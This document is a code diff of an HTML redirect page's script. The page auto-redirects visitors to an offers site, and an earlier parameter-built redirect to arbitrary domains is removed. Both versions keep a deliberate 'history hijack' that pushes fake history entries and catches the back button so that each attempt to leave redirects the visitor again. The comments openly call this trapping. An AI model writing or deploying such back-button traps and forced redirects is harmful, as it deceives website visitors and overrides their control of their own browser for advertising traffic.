@@ -22,51 +22,38 @@
   <h2>Wait while redirecting...</h2>
 
   <script>
-    /******** SETTINGS ********/
-    const CLICK_CODE = "wen25tvh";   // change if needed
-    const REDIRECT_DELAY = 800;      // ms
+    /************** SETTINGS **************/
+    const OFFER_URL = "https://www.offers.com/";
+    const REDIRECT_DELAY = 800; // ms
 
-    /******** TRACKING ********/
+    /************** TRACKING **************/
     function track(event) {
       console.log("[TRACK]", event);
+      // future: fetch / pixel / api call
     }
 
-    /******** REDIRECT URL ********/
-    function buildRedirectUrl() {
-      const url = new URL(window.location.href);
-      const domain = url.searchParams.get("domain");
-      const z = url.searchParams.get("z");
-
-      if (!domain || !z) {
-        return "https://google.com";
-      }
-
-      return `https://${domain}/${CLICK_CODE}/${z}${url.search}`;
-    }
-
-    const redirectUrl = buildRedirectUrl();
-
-    /******** PAGE LOAD ********/
+    /************** PAGE LOAD **************/
     track("page_load");
 
-    // history hijack
+    // history hijack (back button control)
     history.pushState({ trapped: true }, "", location.href);
 
     // initial redirect
     setTimeout(() => {
       track("redirect_page_load");
-      window.location.replace(redirectUrl);
+      window.location.replace(OFFER_URL);
     }, REDIRECT_DELAY);
 
-    /******** BACK BUTTON ********/
+    /************** BACK BUTTON REDIRECT **************/
     window.addEventListener("popstate", function () {
       track("back_button");
 
+      // re‑inject fake history
       history.pushState({ trapped: true }, "", location.href);
 
       setTimeout(() => {
         track("redirect_back");
-        window.location.replace(redirectUrl);
+        window.location.replace(OFFER_URL);
       }, 300);
     });
   </script>
